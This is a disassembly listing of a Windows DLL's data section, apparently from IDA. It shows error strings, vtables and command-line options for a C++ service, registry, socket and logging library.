aCregistryAttac	db 'CRegistry::Attach() : hKey == NULL',0Ah,0 ; DATA XREF: Ordinal998+Co
		align 10h
; char aCregistryOpe_1[]
aCregistryOpe_1	db 'CRegistry::Open() : RegCreateKeyEx() != ERROR_SUCCESS, %s, 0x%08X'
					; DATA XREF: Ordinal993+5Ao
		db 0Ah,0
		align 8
aCregistryOpenR	db 'CRegistry::Open() : RegOpenKeyEx() != ERROR_SUCCESS, %s, 0x%08X',0Ah
					; DATA XREF: Ordinal993+33o
		db 0
		align 4
aCregistryGetst	db 'CRegistry::GetString()',0 ; DATA XREF: Ordinal1003:loc_6AF486B7o
		align 4
off_6AF5D864	dd offset sub_6AF48889	; DATA XREF: Ordinal1022+Ao
					; Ordinal1023o
		dd offset Ordinal1026
		dd 7530h, 1
; char aCserviceInst_3[]
aCserviceInst_3	db 'CService::Install() : ChangeServiceConfig2() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1031+108o
		align 4
aCserviceInst_2	db 'CService::Install() : CreateService() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1031+D7o
		align 4
; char aCserviceInst_1[]
aCserviceInst_1	db 'CService::Install() : path.SplitPath() == FALSE',0Ah,0
					; DATA XREF: Ordinal1031+83o
		align 10h
; char aCserviceInst_0[]
aCserviceInst_0	db 'CService::Install() : OpenSCManager() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1031+4Do
		align 4
; char DatabaseName[]
DatabaseName	db 'ServicesActive',0   ; DATA XREF: Ordinal1031+2Do
					; Ordinal1032+25o
		align 4
; char aCserviceInstal[]
aCserviceInstal	db 'CService::Install() : m_OSInfo.IsWinNT() == FALSE',0Ah,0
					; DATA XREF: Ordinal1031+15o
		align 4
; char aCserviceRemo_2[]
aCserviceRemo_2	db 'CService::Remove() : DeleteService() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1032+9Eo
		align 4
; char aCserviceRemo_1[]
aCserviceRemo_1	db 'CService::Remove() : OpenService() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1032+73o
; char aCserviceRemo_0[]
aCserviceRemo_0	db 'CService::Remove() : OpenSCManager() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1032+42o
		align 10h
; char aCserviceRemove[]
aCserviceRemove	db 'CService::Remove() : m_OSInfo.IsWinNT() == FALSE',0Ah,0
					; DATA XREF: Ordinal1032+Co
		align 8
aCserviceServ_0	db 'CService::ServiceMain() : m_pService->m_hStatus == NULL, 0x%08X',0Ah
					; DATA XREF: .text:6AF48D71o
		db 0
		align 10h
aCserviceServic	db 'CService::ServiceMain() : m_pService->m_hServiceMainThread.Copy()'
					; DATA XREF: .text:6AF48D0Co
		db ' == FALSE',0Ah,0
		align 10h
off_6AF5DB10	dd offset sub_6AF48E61	; DATA XREF: Ordinal1029+3o
					; Ordinal1028+9o
		dd offset _purecall
		dd offset Ordinal1034
		dd offset Ordinal1035
		dd offset Ordinal1036
		dd offset Ordinal1037
		dd offset Ordinal1038
		dd offset Ordinal1039
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1046
		dd offset Ordinal1046
		dd offset Ordinal1046
		dd offset Ordinal1046
; char aCserviceRegi_2[]
aCserviceRegi_2	db 'CService::Register() : WaitForSingleObject() != WAIT_OBJECT_0',0Ah,0
					; DATA XREF: Ordinal1030+174o
		align 8
; char aCserviceRegi_1[]
aCserviceRegi_1	db 'CService::Register() : StartServiceCtrlDispatcher() == FALSE, 0x%'
					; DATA XREF: Ordinal1030+147o
		db '08X',0Ah,0
		align 10h
aCserviceRegi_0	db 'CService::Register()',0 ; DATA XREF: Ordinal1030:loc_6AF48EBBo
		align 4
; char aCserviceRegist[]
aCserviceRegist	db 'CService::Register() : m_OSInfo.IsWinNT() == FALSE',0Ah,0
					; DATA XREF: Ordinal1030+2Co
		dd offset aSoftwareMicr_1 ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
off_6AF5DC30	dd offset aDebug	; DATA XREF: Ordinal1074+608o
					; "Debug"
		dd offset dword_6AF54514
off_6AF5DC38	dd offset aInstall	; DATA XREF: Ordinal1074+55Bo
					; "Install"
		dd offset aI		; "I"
off_6AF5DC40	dd offset aRemove	; DATA XREF: Ordinal1074+58Co
					; "Remove"
		dd offset aR		; "R"
off_6AF5DC48	dd offset ValueName	; DATA XREF: Ordinal1074+33Eo
					; "Version"
		dd offset aV		; "V"
off_6AF5DC50	dd offset aHelp		; DATA XREF: Ordinal1074+369o
					; "Help"
		dd offset asc_6AF5DCEC	; "H"
		dd offset a?		; "?"
off_6AF5DC5C	dd offset aTerminate	; DATA XREF: Ordinal1074+394o
					; "Terminate"
		dd offset aT		; "T"
off_6AF5DC64	dd offset aEmbedding	; DATA XREF: Ordinal1074+62Fo
					; "Embedding"
off_6AF5DC68	dd offset aRegserver	; DATA XREF: Ordinal1074+5B6o
					; "RegServer"
off_6AF5DC6C	dd offset aUnregserver	; DATA XREF: Ordinal1074+5E0o
					; "UnregServer"
		dd offset a_terminate_loc ; "_Terminate_Lock"
		dd offset a_single_instan ; "_Single_Instance_Lock"
		dd offset a_window_class ; "_Window_Class"
; char a_window_class[]
a_window_class	db '_Window_Class',0    ; DATA XREF: Ordinal1056+52o
					; .rdata:6AF5DC78o
		align 4
; char a_single_instan[]
a_single_instan	db '_Single_Instance_Lock',0 ; DATA XREF: Ordinal1074+3D3o
					; .rdata:6AF5DC74o
		align 4
; char a_terminate_loc[]
a_terminate_loc	db '_Terminate_Lock',0  ; DATA XREF: Ordinal1074+202o
					; .rdata:6AF5DC70o
aUnregserver	db 'UnregServer',0      ; DATA XREF: .rdata:off_6AF5DC6Co
aRegserver	db 'RegServer',0        ; DATA XREF: .rdata:off_6AF5DC68o
		align 4
aEmbedding	db 'Embedding',0        ; DATA XREF: .rdata:off_6AF5DC64o
		align 4
aT		db 'T',0                ; DATA XREF: .rdata:6AF5DC60o
		align 4
aTerminate	db 'Terminate',0        ; DATA XREF: .rdata:off_6AF5DC5Co
		align 4
a?		db '?',0                ; DATA XREF: .rdata:6AF5DC58o
		align 4
asc_6AF5DCEC	db 'H',0                ; DATA XREF: .rdata:6AF5DC54o
		align 10h
aHelp		db 'Help',0             ; DATA XREF: .rdata:off_6AF5DC50o
		align 4
aV		db 'V',0                ; DATA XREF: .rdata:6AF5DC4Co
		align 4
aR		db 'R',0                ; DATA XREF: .rdata:6AF5DC44o
		align 10h
aRemove		db 'Remove',0           ; DATA XREF: .rdata:off_6AF5DC40o
		align 4
aI		db 'I',0                ; DATA XREF: .rdata:6AF5DC3Co
		align 4
aInstall	db 'Install',0          ; DATA XREF: .rdata:off_6AF5DC38o
aDebug		db 'Debug',0            ; DATA XREF: Ordinal1202:loc_6AF4BC9Do
					; .rdata:off_6AF5DC30o
		align 4
; char aSoftwareMicr_1[]
aSoftwareMicr_1	db 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\',0
					; DATA XREF: Ordinal1098+8Fo
					; Ordinal1099+4Co ...
		align 8
off_6AF5DD58	dd offset sub_6AF49358	; DATA XREF: Ordinal1050+Fo
					; Ordinal1051o
		dd offset Ordinal1388
		dd offset Ordinal1389
		dd offset Ordinal499
		dd offset Ordinal497
		dd offset Ordinal498
		dd offset Ordinal905
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal1053
		dd offset Ordinal495
		dd offset Ordinal495
		dd offset Ordinal495
		dd offset Ordinal495
off_6AF5DD98	dd offset sub_6AF49374	; DATA XREF: Ordinal1054+Co
					; Ordinal1055o
		dd offset Ordinal1388
		dd offset Ordinal855
		dd offset Ordinal858
		dd offset Ordinal856
		dd offset Ordinal857
		dd offset Ordinal1057
		dd offset Ordinal1058
		dd offset Ordinal1059
		dd offset Ordinal859
; char aCservicewind_2[]
aCservicewind_2	db 'CServiceWindow::OnEndSession() : _endthreadex()',0Ah,0
					; DATA XREF: Ordinal1059+4Ao
		align 4
; char aCservicewind_1[]
aCservicewind_1	db 'CServiceWindow::OnEndSession() : ExitInstance()',0Ah,0
					; DATA XREF: Ordinal1059+38o
		align 4
; char aCservicewind_0[]
aCservicewind_0	db 'CServiceWindow::OnEndSession() : WaitForTerminate()',0Ah,0
					; DATA XREF: Ordinal1059+24o
		align 10h
; char aCservicewindow[]
aCservicewindow	db 'CServiceWindow::OnEndSession() : m_pService->PostTerminate()',0Ah,0
					; DATA XREF: Ordinal1059+11o
		align 10h
off_6AF5DEA0	dd offset sub_6AF493A6	; DATA XREF: Ordinal1061o
					; Ordinal1060+Co ...
off_6AF5DEA4	dd offset sub_6AF493D8	; DATA XREF: Ordinal1067o
					; Ordinal1066+Co
; char aRegisterserv_1[]
aRegisterserv_1	db 'RegisterServiceProcess',0 ; DATA XREF: Ordinal1071:loc_6AF49178o
					; Ordinal1068+22o ...
		align 10h
off_6AF5DEC0	dd offset sub_6AF49476	; DATA XREF: Ordinal1072+23o
					; Ordinal1073+9o
		dd offset _purecall
		dd offset Ordinal1100
		dd offset Ordinal1035
		dd offset Ordinal1036
		dd offset Ordinal1037
		dd offset Ordinal1038
		dd offset Ordinal1039
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1046
		dd offset Ordinal1046
		dd offset Ordinal1046
		dd offset Ordinal1046
		dd offset Ordinal1078
		dd offset Ordinal1079
		dd offset Ordinal1080
		dd offset Ordinal1094
		dd offset Ordinal1090
		dd offset Ordinal1091
		dd offset Ordinal1091
		dd offset Ordinal1094
		dd offset Ordinal1094
		dd offset Ordinal1094
		dd offset Ordinal1098
		dd offset Ordinal1099
		dd offset Ordinal1096
		dd offset Ordinal1095
; char aCserviceappO_0[]
aCserviceappO_0	db 'CServiceApp::OnRunDebug() : Start()',0Ah,0 ; DATA XREF: Ordinal1096+4Bo
		align 4
; char aCserviceappOnr[]
aCserviceappOnr	db 'CServiceApp::OnRunDebug() : m_Console.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1096+16o
		align 10h
; char aCserviceappO_2[]
aCserviceappO_2	db 'CServiceApp::OnInstallService() : reg.SetString() == FALSE',0Ah,0
					; DATA XREF: Ordinal1098:loc_6AF495B6o
; char aCserviceappO_1[]
aCserviceappO_1	db 'CServiceApp::OnInstallService() : path.SplitPath() == FALSE',0Ah,0
					; DATA XREF: Ordinal1098+73o
		align 4
; char aCserviceappOni[]
aCserviceappOni	db 'CServiceApp::OnInstallService() : Install() == FALSE',0Ah,0
					; DATA XREF: Ordinal1098+40o
		align 4
aRpcss		db 'RPCSS',0            ; DATA XREF: Ordinal1098+27o
		align 4
; char aCserviceappO_4[]
aCserviceappO_4	db 'CServiceApp::OnRemoveService() : reg.DeleteValue() == FALSE',0Ah,0
					; DATA XREF: Ordinal1099:loc_6AF49656o
		align 4
; char aCserviceappO_3[]
aCserviceappO_3	db 'CServiceApp::OnRemoveService() : Remove() == FALSE',0Ah,0
					; DATA XREF: Ordinal1099+23o
aCservicewind_3	db 'CServiceWindow::Create()',0 ; DATA XREF: Ordinal1056+32o
		align 4
; char aCserviceapp_20[]
aCserviceapp_20	db 'CServiceApp::Run() : OnRunService()',0Ah,0
					; DATA XREF: Ordinal1074:loc_6AF49E12o
		align 4
; char aCserviceapp_19[]
aCserviceapp_19	db 'CServiceApp::Run() : OnRunEmbedded()',0Ah,0
					; DATA XREF: Ordinal1074+640o
		align 4
; char aCserviceapp_18[]
aCserviceapp_18	db 'CServiceApp::Run() : OnRunDebug()',0Ah,0 ; DATA XREF: Ordinal1074+619o
		align 10h
; char aCserviceapp_17[]
aCserviceapp_17	db 'CServiceApp::Run() : OnUnregServer()',0Ah,0
					; DATA XREF: Ordinal1074+5F1o
		align 4
; char aCserviceapp_16[]
aCserviceapp_16	db 'CServiceApp::Run() : OnRegServer()',0Ah,0 ; DATA XREF: Ordinal1074+5C7o
; char aCserviceapp_15[]
aCserviceapp_15	db 'CServiceApp::Run() : OnRemoveService()',0Ah,0
					; DATA XREF: Ordinal1074+59Do
; char aCserviceapp_14[]
aCserviceapp_14	db 'CServiceApp::Run() : OnInstallService()',0Ah,0
					; DATA XREF: Ordinal1074+56Co
		align 10h
; char aCserviceapp_13[]
aCserviceapp_13	db 'CServiceApp::Run() : ProcessCommandLine() == FALSE',0Ah,0
					; DATA XREF: Ordinal1074+548o
aCserviceapp_12	db 'CServiceApp::Run() : m_EventLog.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal1074+532o
		align 4
; char aCserviceapp_11[]
aCserviceapp_11	db 'CServiceApp::Run() : OnSingleInstance()',0Ah,0
					; DATA XREF: Ordinal1074+4E8o
		align 4
aCserviceapp_10	db 'CServiceApp::Run() : m_InstanceMutex.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1074+4CEo
; char aCserviceappR_9[]
aCserviceappR_9	db 'CServiceApp::Run() : OnTerminate()',0Ah,0 ; DATA XREF: Ordinal1074+3A5o
; char aCserviceappR_8[]
aCserviceappR_8	db 'CServiceApp::Run() : OnShowHelp()',0Ah,0 ; DATA XREF: Ordinal1074+37Ao
		align 4
; char aCserviceappR_7[]
aCserviceappR_7	db 'CServiceApp::Run() : OnShowVersion()',0Ah,0
					; DATA XREF: Ordinal1074+34Fo
		align 4
aCserviceappR_6	db 'CServiceApp::Run() : commandLine.Parse() == FALSE',0Ah,0
					; DATA XREF: Ordinal1074+331o
		align 10h
; char aCserviceappR_5[]
aCserviceappR_5	db 'CServiceApp::Run() : IsTerminating() != FALSE',0Ah,0
					; DATA XREF: Ordinal1074+305o
		align 10h
; char aCserviceappR_4[]
aCserviceappR_4	db 'CServiceApp::Run() : m_TerminateEvent.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1074+2EEo
		align 4
; char aCserviceappR_3[]
aCserviceappR_3	db 'CServiceApp::Run() : adminDacl.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1074+1D3o
		align 10h
; char aCserviceappR_2[]
aCserviceappR_2	db 'CServiceApp::Run() : nullDacl.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1074+1A5o
		align 8
; char aCserviceappR_1[]
aCserviceappR_1	db 'CServiceApp::Run() : CCoInitialize::CoInitialize() != S_OK, 0x%08'
					; DATA XREF: Ordinal1074+173o
		db 'X',0Ah,0
aCservicewind_4	db 'CServiceWindow::Run()',0 ; DATA XREF: Ordinal1074+81o
		align 4
; char aCserviceapp_25[]
aCserviceapp_25	db 'CServiceApp::RunHiddenWindow() : serviceWindow.Terminate()',0Ah,0
					; DATA XREF: Ordinal1101+97o
; char aCserviceapp_24[]
aCserviceapp_24	db 'CServiceApp::RunHiddenWindow() : serviceWindow.Create() == FALSE',0Ah
					; DATA XREF: Ordinal1101+83o
		db 0
		align 4
; char aCserviceapp_23[]
aCserviceapp_23	db 'CServiceApp::RunHiddenWindow() : serviceWindow.Create()',0Ah,0
					; DATA XREF: Ordinal1101:loc_6AF49F01o
		align 10h
aCserviceapp_22	db 'CServiceApp::RunHiddenWindow() : kernel32.Load() == FALSE',0Ah,0
					; DATA XREF: Ordinal1101:loc_6AF49EFAo
		align 10h
aCserviceapp_21	db 'CServiceApp::RunHiddenWindow() : kernel32.RegisterServiceProcess('
					; DATA XREF: Ordinal1101+5Do
		db ') == 0',0Ah,0
		align 4
; char aCserviceappO_7[]
aCserviceappO_7	db 'CServiceApp::OnRunService() : RunHiddenWindow()',0Ah,0
					; DATA XREF: Ordinal1095:loc_6AF49FC0o
		align 10h
; char aCserviceappO_6[]
aCserviceappO_6	db 'CServiceApp::OnRunService() : Register() == FALSE',0Ah,0
					; DATA XREF: Ordinal1095+42o
		align 4
; char aCserviceappO_5[]
aCserviceappO_5	db 'CServiceApp::OnRunService() : Register()',0Ah,0
					; DATA XREF: Ordinal1095+24o
		align 10h
off_6AF5E680	dd offset sub_6AF4AD22	; DATA XREF: Ordinal1113+Eo
					; Ordinal1115+2o ...
		dd offset Ordinal1160
		dd offset Ordinal1162
		dd offset Ordinal1162
; char aCsocketStartup[]
aCsocketStartup	db 'CSocket::Startup() : WSAStartup() != 0, %d',0Ah,0
					; DATA XREF: Ordinal1119+28o
; char aCsocketStart_0[]
aCsocketStart_0	db 'CSocket::Startup() : WSACleanup() != 0, %d',0Ah,0
					; DATA XREF: Ordinal1120+11o
; char aCsocketBindBin[]
aCsocketBindBin	db 'CSocket::Bind() : bind() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1125+1Eo
		align 4
; char aCsocketConnect[]
aCsocketConnect	db 'CSocket::Connect() : WSAConnect() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1127+29o
		align 10h
; char aCsocketListenL[]
aCsocketListenL	db 'CSocket::Listen() : listen() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1129+3Do
		align 4
; char aCsocketListenB[]
aCsocketListenB	db 'CSocket::Listen() : Bind() == FALSE',0Ah,0 ; DATA XREF: Ordinal1129+10o
		align 4
; char aCsocketAcceptW[]
aCsocketAcceptW	db 'CSocket::Accept() : WSAAccept() == INVALID_SOCKET, %d',0Ah,0
					; DATA XREF: Ordinal1131+54o
		align 4
; char aCsocketReadPda[]
aCsocketReadPda	db 'CSocket::Read() : pData == NULL',0Ah,0
					; DATA XREF: Ordinal1132:loc_6AF4A273o
		align 4
; char aCsocketReadWsa[]
aCsocketReadWsa	db 'CSocket::Read() : WSARecv() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1132+53o
		align 4
; char aCsocketWritePd[]
aCsocketWritePd	db 'CSocket::Write() : pData == NULL',0Ah,0
					; DATA XREF: Ordinal1133:loc_6AF4A3A7o
		align 10h
; char aCsocketWrite_0[]
aCsocketWrite_0	db 'CSocket::Write() : WSAGetOverlappedResult() == FALSE, %d',0Ah,0
					; DATA XREF: Ordinal1133+CFo
		align 4
; char aCsocketWriteWs[]
aCsocketWriteWs	db 'CSocket::Write() : WSASend() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1133+A5o
					; Ordinal1133+111o
		align 10h
; char aCsocketWriteHe[]
aCsocketWriteHe	db 'CSocket::Write() : hEvent.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1133+60o
		align 10h
; char aCsocketShutdow[]
aCsocketShutdow	db 'CSocket::Shutdown() : shutdown() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1134+37o
		align 4
; char aCsocketCloseCl[]
aCsocketCloseCl	db 'CSocket::Close() : closesocket() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1135+75o
		align 10h
; char aCsocketCloseSe[]
aCsocketCloseSe	db 'CSocket::Close() : setsockopt() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1135+53o
		align 4
; char aCsocketIsliste[]
aCsocketIsliste	db 'CSocket::IsListening() : getsockopt() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1138+37o
		align 8
; char aCeventsocketGe[]
aCeventsocketGe	db 'CEventSocket::GetReadPending() : ioctlsocket() == SOCKET_ERROR, %'
					; DATA XREF: Ordinal1139+2Fo
		db 'd',0Ah,0
		align 10h
; char aCeventsocketSe[]
aCeventsocketSe	db 'CEventSocket::SetBlocking() : ioctlsocket() == SOCKET_ERROR, %d',0Ah
					; DATA XREF: Ordinal1140+2Fo
		db 0
		align 8
; char aCsocketSetwrit[]
aCsocketSetwrit	db 'CSocket::SetWriteBufferSize() : setsockopt() == SOCKET_ERROR, %d',0Ah
					; DATA XREF: Ordinal1142+29o
		db 0
		align 10h
; char aCsocketSetread[]
aCsocketSetread	db 'CSocket::SetReadBufferSize() : setsockopt() == SOCKET_ERROR, %d',0Ah
					; DATA XREF: Ordinal1143+29o
		db 0
		align 8
; char aCsocketGetwrit[]
aCsocketGetwrit	db 'CSocket::GetWriteBufferSize() : getsockopt() == SOCKET_ERROR, %d',0Ah
					; DATA XREF: Ordinal1145+37o
		db 0
		align 10h
; char aCsocketGetread[]
aCsocketGetread	db 'CSocket::GetReadBufferSize() : getsockopt() == SOCKET_ERROR, %d',0Ah
					; DATA XREF: Ordinal1146+37o
		db 0
		align 4
; char aCsocketSetre_0[]
aCsocketSetre_0	db 'CSocket::SetReadTimeout() : setsockopt() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1148+29o
		align 4
; char aCsocketSetwr_0[]
aCsocketSetwr_0	db 'CSocket::SetWriteTimeout() : setsockopt() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1149+29o
		align 4
; char aCsocketGetre_0[]
aCsocketGetre_0	db 'CSocket::GetReadTimeout() : getsockopt() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1151+37o
		align 4
; char aCsocketGetwr_0[]
aCsocketGetwr_0	db 'CSocket::GetWriteTimeout() : getsockopt() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1152+37o
		align 8
; char aCsocketGetconn[]
aCsocketGetconn	db 'CSocket::GetConnectedTime() : getsockopt() == SOCKET_ERROR, %d',0Ah,0
					; DATA XREF: Ordinal1153+39o
; char aCsocketGetloca[]
aCsocketGetloca	db 'CSocket::GetLocalAddress() : getsockname() != 0, %d',0Ah,0
					; DATA XREF: Ordinal1154+29o
		align 10h
; char aCsocketGetremo[]
aCsocketGetremo	db 'CSocket::GetRemoteAddress() : getpeername() != 0, %d',0Ah,0
					; DATA XREF: Ordinal1155+29o
		align 4
; char aCsocketSetdefa[]
aCsocketSetdefa	db 'CSocket::SetDefaultOptions() : setsockopt() != 0, %d',0Ah,0
					; DATA XREF: Ordinal1160+30o
		align 10h
; char aCigsockaddrinG[]
aCigsockaddrinG	db 'CIGSockAddrIn::GetHostAddress() : dwRequiredSize > dwSize',0Ah,0
					; DATA XREF: Ordinal1108+35o
		align 4
; char aCaddressSetadd[]
aCaddressSetadd	db 'CAddress::SetAddress() : gethostbyname() == NULL, %d',0Ah,0
					; DATA XREF: Ordinal1110+53o
		align 4
; char aCsocketCreateW[]
aCsocketCreateW	db 'CSocket::Create() : WSASocket() == INVALID_SOCKET, %d',0Ah,0
					; DATA XREF: Ordinal1121+34o
		align 4
; char aCsocketAttachH[]
aCsocketAttachH	db 'CSocket::Attach() : hSocket == INVALID_SOCKET',0Ah,0
					; DATA XREF: Ordinal1122+Do
		align 4
; char aCsocketBindSoc[]
aCsocketBindSoc	db 'CSocket::Bind() : sockAddr.SetAddress() == FALSE',0Ah,0
					; DATA XREF: Ordinal1126+3Bo
		align 10h
; char aCsocketConne_1[]
aCsocketConne_1	db 'CSocket::Connect() : szHost == NULL',0Ah,0
					; DATA XREF: Ordinal1128:loc_6AF4ABDFo
		align 4
aCsocketConne_0	db 'CSocket::Connect() : sockAddr.SetAddress() == FALSE',0Ah,0
					; DATA XREF: Ordinal1128:loc_6AF4ABD8o
		align 10h
; char aCsocketListenS[]
aCsocketListenS	db 'CSocket::Listen() : sockAddr.SetAddress() == FALSE',0Ah,0
					; DATA XREF: Ordinal1130+3Bo
; char aCsocketCsocket[]
aCsocketCsocket	db 'CSocket::CSocket() : Attach() == FALSE',0Ah,0
					; DATA XREF: Ordinal1114+22o
; char aCsocketOperato[]
aCsocketOperato	db 'CSocket::operator =() : Attach() == FALSE',0Ah,0
					; DATA XREF: Ordinal1116+10o
		align 4
; char aCinstalleda_19[]
aCinstalleda_19	db 'CInstalledApps::GetWindowsDirectory() : nRet == 0, 0x%08X',0
					; DATA XREF: Ordinal1183+1Eo
					; Ordinal1184+68o
		align 4
; char aCinstalleda_20[]
aCinstalleda_20	db 'CInstalledApps::GetSystemDirectory() : nRet == 0, 0x%08X',0
					; DATA XREF: Ordinal1185+1Eo
					; Ordinal1186+68o
		align 10h
off_6AF5EFF0	dd offset sub_6AF4AF83	; DATA XREF: Ordinal1164+6o
					; Ordinal1163+6o
aCinstalleda_21	db 'CInstalledApps::GetWindowsDirectory()',0 ; DATA XREF: Ordinal1184+18o
		align 4
aCinstalleda_22	db 'CInstalledApps::GetSystemDirectory()',0 ; DATA XREF: Ordinal1186+18o
		align 4
; char aCsplitpathSp_1[]
aCsplitpathSp_1	db 'CSplitPath::SplitPath() : GetLongPathName() == 0, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1165+2B9o
		align 10h
; char aCsplitpathSp_0[]
aCsplitpathSp_0	db 'CSplitPath::SplitPath() : GetShortPathName() == 0, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1165+1C4o
		align 4
aCsplitpathSpli	db 'CSplitPath::SplitPath()',0 ; DATA XREF: Ordinal1165+3Co
; char aCsplitpathSp_3[]
aCsplitpathSp_3	db 'CSplitPath::SplitModule() : GetModuleFileName() == 0, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1166+6Bo
		align 4
aCsplitpathSp_2	db 'CSplitPath::SplitModule()',0 ; DATA XREF: Ordinal1166+2Ao
		align 10h
aCsplitpathGetm	db 'CSplitPath::GetModuleDirectory()',0
					; DATA XREF: Ordinal1190:loc_6AF4B87Eo
		align 8
; char aCsplitpathGetp[]
aCsplitpathGetp	db 'CSplitPath::GetProcessDirectory() : path.SplitModule() == FALSE',0Ah
					; DATA XREF: Ordinal1190+40o
		db 0
		align 10h
; char aCsplitpathGe_0[]
aCsplitpathGe_0	db 'CSplitPath::GetModuleDirectory() : GetModuleDirectory() == FALSE',0Ah
					; DATA XREF: Ordinal1189+1Fo
		db 0
		align 4
; char aCstreamarchi_0[]
aCstreamarchi_0	db 'CStreamArchive::ReadEx() : m_piStream->Read() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1195+3Fo
		align 4
; char aCstreamarchive[]
aCstreamarchive	db 'CStreamArchive::ReadEx() : m_piStream == NULL',0Ah,0
					; DATA XREF: Ordinal1195+Bo
		align 8
; char aCstreamarchi_2[]
aCstreamarchi_2	db 'CStreamArchive::WriteEx() : m_piStream->Write() != S_OK, 0x%08X',0Ah
					; DATA XREF: Ordinal1196+3Fo
		db 0
		align 4
; char aCstreamarchi_1[]
aCstreamarchi_1	db 'CStreamArchive::WriteEx() : m_piStream == NULL',0Ah,0
					; DATA XREF: Ordinal1196+Bo
		align 10h
; char aCstreamarchi_4[]
aCstreamarchi_4	db 'CStreamArchive::SetPosEx() : m_piStream->Seek() != S_OK, 0x%08X',0Ah
					; DATA XREF: Ordinal1197+4Co
		db 0
		align 4
; char aCstreamarchi_3[]
aCstreamarchi_3	db 'CStreamArchive::SetPosEx() : m_piStream == NULL',0Ah,0
					; DATA XREF: Ordinal1197+Co
		align 4
off_6AF5F348	dd offset sub_6AF4BBA7	; DATA XREF: Ordinal1191+Fo
					; Ordinal1192+3o
		dd offset Ordinal1195
		dd offset Ordinal1196
		dd offset Ordinal1197
; char aCstreamarchi_5[]
aCstreamarchi_5	db 'CStreamArchive::Reference() : pStream == NULL',0Ah,0
					; DATA XREF: Ordinal1193+7o
		align 4
off_6AF5F388	dd offset sub_6AF4BBE4	; DATA XREF: Ordinal1199+6o
					; Ordinal1198+10o
		dd offset Ordinal406
; char aSSSSSSSSSSSSS[]
aSSSSSSSSSSSSS	db '%s%s%s%s%s%s%s%s%s%s%s%s%s',0Dh,0Ah,0 ; DATA XREF: Ordinal1202+158o
		align 10h
; char a02d02d02d03d[]
a02d02d02d03d	db '%02d:%02d:%02d:%03d',0 ; DATA XREF: Ordinal1202+126o
; char a04d02d02d[]
a04d02d02d	db '%04d-%02d-%02d',0   ; DATA XREF: Ordinal1202+101o
		align 4
aInformation	db 'Information',0      ; DATA XREF: Ordinal1202:loc_6AF4BCCAo
aWarning	db 'Warning',0          ; DATA XREF: Ordinal1202:loc_6AF4BCC1o
aError		db 'Error',0            ; DATA XREF: Ordinal1202:loc_6AF4BCB8o
		align 10h
aAuditsuccess	db 'AuditSuccess',0     ; DATA XREF: Ordinal1202:loc_6AF4BCAFo
		align 10h
aAuditfailure	db 'AuditFailure',0     ; DATA XREF: Ordinal1202:loc_6AF4BCA6o
		align 10h
aUnknown	db 'Unknown',0          ; DATA XREF: Ordinal1202+94o
; char aCstructuredl_0[]
aCstructuredl_0	db 'CStructuredLogFile::LogV() : Filter() == FALSE',0Ah,0
					; DATA XREF: Ordinal1202+62o
aCstructuredlog	db 'CStructuredLogFile::LogV',0 ; DATA XREF: Ordinal1202+2Co
		align 4
; char asc_6AF5F464[]
asc_6AF5F464	db '"',0                ; DATA XREF: Ordinal1198+1Bo
		align 4
; char asc_6AF5F468[]
asc_6AF5F468	db ', ',0               ; DATA XREF: Ordinal1198+8o
		align 4
off_6AF5F46C	dd offset sub_6AF4C0A0	; DATA XREF: Ordinal1218+10o
					; Ordinal1221o	...
		dd offset Ordinal1326
		dd offset Ordinal1058
		dd offset Ordinal1118
off_6AF5F47C	dd offset sub_6AF4C141	; DATA XREF: Ordinal1216+9o
					; Ordinal1217o
off_6AF5F480	dd offset sub_6AF4C7E6	; DATA XREF: Ordinal1229+Ao
					; Ordinal1228+13o ...
off_6AF5F484	dd offset unknown_libname_8 ; DATA XREF: Ordinal1241+2o
					; Ordinal1242o	...
					; Microsoft VisualC 2-10/net runtime
		dd offset _purecall
		dd offset _purecall
		dd offset _purecall
		dd offset _purecall
off_6AF5F498	dd offset sub_6AF4C565	; DATA XREF: Ordinal1243+10o
					; Ordinal1244+6o
		dd offset Ordinal1245
		dd offset Ordinal1246
		dd offset Ordinal1247
		dd offset Ordinal1248
off_6AF5F4AC	dd offset sub_6AF4C620	; DATA XREF: Ordinal1249+6o
					; Ordinal1250+6o
		dd offset Ordinal1251
